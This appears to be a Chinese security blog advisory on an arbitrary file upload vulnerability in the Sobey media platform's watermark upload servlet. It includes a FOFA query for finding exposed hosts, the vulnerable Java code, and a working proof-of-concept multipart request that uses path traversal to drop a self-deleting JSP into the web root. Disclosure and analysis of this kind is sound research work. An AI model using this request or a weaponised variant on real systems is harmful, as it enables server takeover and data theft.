---
title: "索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞"
source: https://mrxn.net/jswz/sobey-watermark-upload-rce.html
asset_dir: assets/索贝融媒体-sobey-mcheditorwatermarkupload-文件上传漏洞
---

# 索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/16 08:26
- 985浏览
- [1评论](#comment)
- 32分钟阅读

深入探索

Nessus

计算机安全

网络安全培训

---

# 漏洞简介

索贝融媒体是一套面向媒体机构的综合内容生产与管理平台，广泛应用于电视台、融媒体中心等场景，提供稿件采编、媒资处理、节目编排及多终端发布等功能。该系统的 **/sobey-mchEditor/watermark/upload** 接口在[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)功能中缺乏有效的类型与安全校验，攻击者可通过构造特制的上传请求，将任意可执行脚本或恶意文件写入服务器指定目录。成功利用该漏洞后，攻击者可能直接在服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取系统权限、控制业务逻辑、窃取敏感数据，甚至进一步对内网环境发起攻击，对业务安全构成严重威胁。

漏洞扫描服务

# 影响版本

# fofa语法

> app="SOBEY-融媒体"

# 漏洞分析

深入探索

SQL注入防护

SQL

防火墙软件

直接看漏洞url对应的WebServlet实现逻辑

```
@WebServlet({"/watermark/upload"})
public class WatermarkUploader extends HttpServlet {
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        req.setCharacterEncoding("utf-8");
        resp.setContentType("application/json;charset=utf-8");
        FileItemFactory factory = new DiskFileItemFactory();

        try {
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setFileSizeMax(20480000L);

            for(FileItem fileItem : upload.parseRequest(req)) {
                if (!fileItem.isFormField()) {
                    String name = fileItem.getName();
                    if (name.contains("\\")) {
                        name = name.substring(name.lastIndexOf("\\") + 1);
                    }

                    long size = fileItem.getSize();
                    if (size != 0L) {
                        String path = Constant.UPLOAD_PATH + SimpleDateFormatFactory.format(new Date(), "yyyy/MM/dd");
                        String filePath = SystemConfigUtil.getDiskpath() + path;
                        File file = new File(filePath);
                        if (!file.exists()) {
                            file.mkdirs();
                        }

                        fileItem.write(new File(filePath + "/" + name));
                        ZCNWatermarkSchema watermark = new ZCNWatermarkSchema();
                        watermark.setID(NoUtil.getMaxID("WatermarkID"));
                        watermark.setSiteID(1L);
                        watermark.setTitle(name);
                        watermark.setType("watermark");
                        watermark.setUrl(SystemConfigUtil.getNgixPath() + path + "/" + name);
                        watermark.setAddTime(new Date());
                        watermark.insert();
                    }
                }
            }

            resp.getWriter().write("{\"status\":200}");
        } catch (Exception e) {
            e.printStackTrace();
            resp.getWriter().write("{\"status\":500}");
        }

    }
}
```

深入探索

SQL注入检测工具

云安全解决方案

数据库

一个基于Servlet的文件上传功能，专门用于上传水印图片。它利用Apache Commons FileUpload库解析HTTP多部分请求，将上传的图片保存到服务器的指定目录下（按日期组织），同时将水印的相关信息（如ID、名称、URL、添加时间）保存到数据库中。整个过程包含了错误处理，成功则返回 `{"status":200}`，失败则返回 `{"status":500}`。代码中还包含了对文件名中的路径处理、文件大小限制以及目录自动创建的逻辑。但是没有对上传文件类型和内容进行检测，导致可以[上传任意文件内容](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)。

# 漏洞复现

```
POST /sobey-mchEditor/watermark/upload HTTP/1.1
Host: sobey.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/1.jsp"
Content-Type: image/jpeg

<%out.println(java.util.UUID.randomUUID().toString());new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary--
```

访问上传文件 `/sobey-mchEditor/1.jsp`

[![索贝融媒体 /sobey-mchEditor/watermark/upload 文件上传漏洞](images/img-001-8287b385ba05.webp)](https://image.mrxn.net/5239cd950d8a407e9313217a33a50edc.webp)

成[执行上传代码](https://mrxn.net/tag/rce)，打印UUID并删除自身

安全研究工具

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKSUlEQVR4AeycgXLbOAxE/fr//3znFbokTFKUnDSWpmUm6IKLBcgQQpw4N/fr8Xj89137r/k4W69J25Y5dyPSPzlmP4XL15E5++/qnXcWXf+7qIY8a6zPu9xAacjzSXi8Y6MvAHgAo9AL531eyN8Lx4TAVg8Cf0s2UFy2LZp/IPRQ0RLoOceEEHH5NjjHWa9zvWPOE5aGaLHs+hvoGgLxNMAY3z3y6EmBqJ1rQc85N+taHyIPKCHnCU3Kb80xoEziWc61rB8h1LrQ+6OcriEj0eI+dwOrIZ+761M7/UhDPM5CiFHNpxEvG3EQeqgorSzr3/Uh6o3yVNvmuNcZHftJ/JGG/OSB//baP9IQiKcRKPcHdC+cJZic0RMJkTuKZc5+Kte5ELWALiZiVAPYzu6YUNqfsB9pyOMnTvqP1FwNuVmju4ZoHGf27vldK+dBfAuAHrNulOs4RK7XQui5tobXQuW0Bn2NVqM1HOu0x8xUp7WuIa1grT97A6UhEB2Hczg7Zn4qIOplzrkjzjEhvOZCrIHyvhvMOdX5tEE9Exz7+XylIZlc/nU3sBpy3d0Pd/6Vv2181Xdl53u9h9ZBHec9rXgInfOEEJzirSlug9C1a6BNO1wD2+8jUL9lOsn1v4trQnyjN8GuIVCfgtEZocbh2PcTk2tB5GXOPkQM+qfQmoyuLzQPtYY5o3Q2c0c40kPdA3gpAZRJgmM/J3cNycGb+f/EcX5BdNBfrZ8GIbzGpBHfmvhsOZ75d3143R9iDXV6oHKun/e371hGx6CvAZWD8HOu/VkNxzI6LyNEfeCxJuRxr4/VkHv1o04I1LGB8H1WiDWM0SNpfUboc3LcvmtkdGyEEHVHsbMc7NfI57Cf67ac1xkh6kPFWQ3F1oToFm5kpSG5s62fz9vGtIZ4AuTLjvSOS2uDqAEVRzrrRwiR6zwhBAc9uoZ0M4PIzRp45SDWUDHr7XtPIYRWvq00xAkLr72B1ZBr77/bvbyXBTE+neJJeJyEEDqoKF72lG6fUGMbsfMP9DrVaW2UDjUXwnfeSG/OGuGIEy9zTKh1a+L3rNXmdc4xn7k1Ifk2buCXhoy6BfHk5XNal9FxCP0oZs0RQtQAihTo3hty8Oxe1kGt5RpnEc7lQuhyXdjnIGJA/T3ksT5ucQNlQm5xmnWIfkKgjo/HPN8T1Di8+tbDKw+va9ezPqNjGXO89bPOPtT9zI0Qqg7Ctw5iDZh6QZ8D2L6d5qBjmbMPoYf6BqljwjUhuoUbWWkIROfy2SA4qOi4n4KMjn0FIfbIudBzjkPEoEdrMkLoMmd/9DVkDiJ3xLnGEeZc+9DXLQ05Krjin7mB1ZDP3PPpXcpfDD1GR+jKEOMGmNpe3KCuFZjVU3xmzrUGGO7huPXvItS6EL5rCl1P/lcN+rquBRED+p+yHuvjT9zAl2uU97JGFSA6l2N+WjI6njn7EDWgR+cJrZffGkSuNRmzFkIHFXP8HR9qDeh9n2FUE0I/ih1x6zXk6IY+HO8aAtFdqL+4QOV8PtjnrDlCqDUgfD95QghuVkc620gH+zWgj7nWCEf1rRvFIOoDJQyU18FRbteQkrmcS25gNeSSa9/ftPzYa4nHSPhVDupYusYItYfNcdjPhT4GlXOtjK5rhF7vmBBqHMIXv2fQa/L+9p3vtRAiV75tTYhv6iZYGgLRLag4OyNUHYQ/0/sJyAiRB5TUHDdpzuuMjgmB8oIJ4VsLr2vzQuXatN4za4TWyJd5LYT9vRS3KU8GoQfWL4aPm32UCbnZuf7Z40wbAjFKo9vRqLUG+/pcA0KX83N8zz/S57j9tpZ5IcQ5oKL41lwDqg5efWuEzpdvG3GOZZw2JAuX/5kbKO9luYMjhPo0+FjQc46NajiWEWoN50DlrIXgvM4IEQMKDZQXd9ctweTMYklWamXuTC7Uc0D4ucbIXxMyupULudWQCy9/tHVpCMRIQY+jRI+ssI1DXwMqp5zWIOJtrb01hD7XsXbGWSOE/RqK21zPayFErnyZNUKImHybNK1BrysNacVrfc0NfLkhEN0FyslnT4NjQicA5QVTfGvWmYdeD5WzPiNE3BzEGuqfFxwTQsTlt+ZzCB2TL4PIAxw6ROXJgHIPX27I4W5L8KUbmL7bq+7JRpXF2yA6bJ15obmM8KpXDIKDiuKzqZ7NvNdCc1BriJdBcNYIITioKK1McRvUOIQvjQxibe138YIJ+e6R/+781ZCb9bf8pu5zQYwgVNRo2kY6czOEvl7Wu/4IrYNaA3rfuhHO6mY9RN3MnfFz/Zkeoj5UzPo1Ifk2buCXhuQO2/f5oHYTwrdG2Oq8/gpC1Ae6dO01sy7hSQDbj5RPd/uEWAPb+sw/3jNrga3uKDbinOvYHpaGOGHhtTewGnLt/Xe7l4ZAjGCnaAiPGoQe6m+8s1guA5FrvdBx+TZzEHqvhRAc9Oh8obQyCJ04m3iZ10Kt90xxW6uBqA+0oW29l6cgsH37A9bf1B83+ygTMjuXuyuE6KZ8GwQHgbkWBGetMMdnPkSuNRBr6KdSdW3WC0ec+K8Y1P2dD8F5LYR9DiIGSNrZqYZ0WTck/pYjrYbcrJPdm4tAeYHxuMM5zvqMo6/X8RyD2CNzI53jEHqo6FhGiPio1ohzLkQeVHRshK4lPIpLIxvp1oSMbuVCrryXpY61BvF0ZB72OYhY/nqcmznodTl+xp/VhagPlFJAmXwI30GINWCq/M/+vU+LFpoHSv0RBxF3nhB6bk2IbuZGthpyo2boKOVFHfrxGY3ejHNMhW3Q121jgKkpur4Q2L5FyD9js8I5f6aD2BMoMmA7RyGeDvTck+4+vW8OrAnJt3EDv3tRH53JnRQ6Lt9mDuLJgIqtRlpzI4SaK63MOqgxc4rbIOJeHyGEHirOcryn0Dr5e2bNO7gmZHpbnw92ryFQnxY457fHzk+MYzCvZV3OhdecWQxwie17OrChSed6LRxx4mUQ+VBR/J7BXOe9YK5bE7J3wxfxqyEXXfzetqUhHqmzuFdwjz+qC3WUIfw2Z692y+c8iFrW5Ni7HEQtwKkFR3VL8OkA27fQI11pyDNnfd7gBrqGQHQSxjg7s7s/0kCtN4o7NyNEjvUQaxj/gcq676D3h7rXrB5UHbz6Oc91M2ffMWHXEIsWXnMDqyHX3Pvurh9riMbRtnuaZwDq2D+X2ycEty1+/wPBQcXfodMANRde/VERn1/ouPzWHDtCeN0TWP/VyeOCj9mWf3RCoO84BDc7hGLQ6/zkKS7zWqh1a+JlELWAIgG2HzsL8XSklT3d8qm1rBDJgagBFBY4VbckHDh/tCEHe63wiRtYDTlxSZ+UdA3RuM5sdrhR3kgPMeZQ0bpco+Wg11sjhIjLt+V68iE0UFG8DYL3eg/b+hB5gEMvf5cHdr+15T26hpRqy7nkBkpDIDoI53B2Wqg1Zrr8ZIx0UOsALxLnZnLEOQ50T2gbA0wNEdhqACUObJz3FjoIEQNMDRHYagDrx97HzT7KhNzsXP/scf4HAAD//w4iJOoAAAAGSURBVAMAWSxws0xnDwIAAAAASUVORK5CYII=)

手机扫码阅读
